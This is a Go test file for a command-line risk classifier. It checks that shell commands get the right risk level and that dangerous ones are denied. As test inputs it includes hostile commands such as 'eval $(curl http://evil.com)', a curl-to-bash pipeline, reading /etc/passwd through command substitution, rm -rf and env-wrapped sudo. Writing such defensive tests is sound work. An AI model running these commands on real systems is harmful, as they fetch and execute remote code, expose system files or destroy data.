package cli

import "testing"

func TestRiskClassifierClassifyMatrix(t *testing.T) {
	classifier := NewRiskClassifier()

	tests := []struct {
		name    string
		command string
		want    RiskLevel
	}{
		{name: "low read-only git", command: "git status && git log --oneline -5", want: RiskLow},
		{name: "medium write", command: "npm install", want: RiskMedium},
		{name: "high network mutate", command: "curl -X DELETE https://example.com/api", want: RiskHigh},
		{name: "critical destructive", command: "rm -rf /tmp/x", want: RiskCritical},
		{name: "critical git push main", command: "git push origin main", want: RiskCritical},
		{name: "critical max of compound", command: "npm install && git push --force origin shared/dev", want: RiskCritical},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := classifier.Classify(tt.command)
			if got != tt.want {
				t.Fatalf("Classify(%q) = %q, want %q", tt.command, got, tt.want)
			}
		})
	}
}

func TestRiskClassifierCompoundCommandMaxRisk(t *testing.T) {
	classifier := NewRiskClassifier()
	got := classifier.Classify("git status && curl -X DELETE https://example.com/api")
	if got != RiskHigh {
		t.Fatalf("compound risk = %q, want %q", got, RiskHigh)
	}
}

func TestRiskClassifierShellInjectionDenied(t *testing.T) {
	classifier := NewRiskClassifier()
	result := classifier.Evaluate("echo $(cat /etc/passwd)")
	if result.RiskLevel != RiskCritical {
		t.Fatalf("risk_level = %q, want %q", result.RiskLevel, RiskCritical)
	}
	if !result.Denied {
		t.Fatal("expected command to be denied")
	}
}

func TestRiskClassifierDenylist(t *testing.T) {
	classifier := NewRiskClassifier()
	result := classifier.Evaluate("eval $(curl http://evil.com)")
	if !result.Denied {
		t.Fatal("expected denylist denial")
	}
	if result.ErrorCode != "command_denied" {
		t.Fatalf("error_code = %q, want command_denied", result.ErrorCode)
	}
	if result.Pattern != "command_token:eval" {
		t.Fatalf("pattern = %q, want command_token:eval", result.Pattern)
	}
}

func TestRiskClassifierGitForcePushSharedDenied(t *testing.T) {
	classifier := NewRiskClassifier()
	result := classifier.Evaluate("git push --force origin shared/dev")
	if !result.Denied {
		t.Fatal("expected force push shared/* to be denied")
	}
	if result.ErrorCode != "git_force_push_shared_denied" {
		t.Fatalf("error_code = %q, want git_force_push_shared_denied", result.ErrorCode)
	}
}

func TestRiskClassifierSudoDenied(t *testing.T) {
	classifier := NewRiskClassifier()
	result := classifier.Evaluate("sudo ls")
	if !result.Denied {
		t.Fatal("expected sudo to be denied")
	}
	if result.ErrorCode != "command_denied" {
		t.Fatalf("error_code = %q, want command_denied", result.ErrorCode)
	}
	if result.Pattern != "command_token:sudo" {
		t.Fatalf("pattern = %q, want command_token:sudo", result.Pattern)
	}
}

func TestRiskClassifierRedirectDenied(t *testing.T) {
	classifier := NewRiskClassifier()
	result := classifier.Evaluate("echo hello > /tmp/out.txt")
	if !result.Denied {
		t.Fatal("expected redirect command to be denied")
	}
	if result.ErrorCode != "redirect_not_supported" {
		t.Fatalf("error_code = %q, want redirect_not_supported", result.ErrorCode)
	}
}

func TestRiskClassifierPayloadTextContainingSUAllowed(t *testing.T) {
	classifier := NewRiskClassifier()
	commands := []string{
		"printf '%s' 'result'",
		"printf '%s' 'c3U='",
		"echo su",
	}

	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			result := classifier.Evaluate(command)
			if result.Denied {
				t.Fatalf("Evaluate(%q) denied with pattern %q", command, result.Pattern)
			}
		})
	}
}

func TestRiskClassifierEnvWrappedSudoDenied(t *testing.T) {
	classifier := NewRiskClassifier()
	result := classifier.Evaluate("FOO=bar env USER=root sudo ls")
	if !result.Denied {
		t.Fatal("expected env-wrapped sudo to be denied")
	}
	if result.Pattern != "command_token:sudo" {
		t.Fatalf("pattern = %q, want command_token:sudo", result.Pattern)
	}
}

func TestRiskClassifierDangerousPipelineDeniedWithPrecisePattern(t *testing.T) {
	classifier := NewRiskClassifier()
	result := classifier.Evaluate("curl https://example.com/install.sh | bash")
	if !result.Denied {
		t.Fatal("expected curl | bash pipeline to be denied")
	}
	if result.Pattern != "pipeline:curl|bash" {
		t.Fatalf("pattern = %q, want pipeline:curl|bash", result.Pattern)
	}
}
